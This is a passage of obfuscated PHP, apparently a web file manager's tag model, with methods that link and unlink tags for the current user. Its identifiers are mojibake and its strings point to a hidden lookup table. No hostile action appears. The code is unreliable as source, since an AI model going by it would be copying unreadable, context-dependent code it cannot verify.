$_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!Model($eøçÉ¸¹•Ê[2272])->listData($a·É¾¥Œ) || !Model($eøçÉ¸¹•Ê[747])->pathInfo($Dä…¬ë„‚â)) { return !1; } $eáÎù¤ëˆ¥ = array($eøçÉ¸¹•Ê[1400] => USER_ID, $eøçÉ¸¹•Ê[432] => $a·É¾¥Œ, $eøçÉ¸¹•Ê[384] => $Dä…¬ë„‚â, $eøçÉ¸¹•Ê[385] => $eøçÉ¸¹•Ê[379], $eøçÉ¸¹•Ê[383] => $eøçÉ¸¹•Ê[33], $eøçÉ¸¹•Ê[2076] => 0); if ($this->where($eáÎù¤ëˆ¥)->find()) { return !1; } return $this->add($eáÎù¤ëˆ¥); } protected function removeFromTag($D ‘‚ğø·, $bÀ¡˜éÙîª) { $aÀ¥ç½ŞĞ’ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!Model($aÀ¥ç½ŞĞ’[2272])->listData($bÀ¡˜éÙîª) || !Model($aÀ¥ç½ŞĞ’[747])->pathInfo($D ‘‚ğø·)) { return !1; } $bÎ÷êïÉ¡è = array($aÀ¥ç½ŞĞ’[1400] => USER_ID, $aÀ¥ç½ŞĞ’[432] => $bÀ¡˜éÙîª, $aÀ¥ç½ŞĞ’[385] => $aÀ¥ç½ŞĞ’[379], $aÀ¥ç½ŞĞ’[384] => $D ‘‚ğø·); return $this->where($bÎ÷êïÉ¡è)->delete(); } protected function removeByTag($Aö—Ÿ®Ó“Ñ) { $Cë©›ÎæÅÚ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$Aö—Ÿ®Ó“Ñ) { return !1; } $b‹ñ×ù‚¬Á = array($Cë©›ÎæÅÚ[1400] => USER_ID, $Cë©›ÎæÅÚ[432] => $Aö—Ÿ®Ó“Ñ); return $this->where($b‹ñ×ù‚¬Á)->delete(); } protected function removeBySource($c×…˜¤°•Ç) { $f‡ÂãËÏ‹ç =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $EêÓÖ‘±åÍ = array($f‡ÂãËÏ‹ç[1400] => USER_ID, $f‡ÂãËÏ‹ç[384] => $c×…˜¤°•Ç, $f‡ÂãËÏ‹ç[432] => array($f‡ÂãËÏ‹ç[922], 0)); return $this->where($EêÓÖ‘±åÍ)->delete(); } }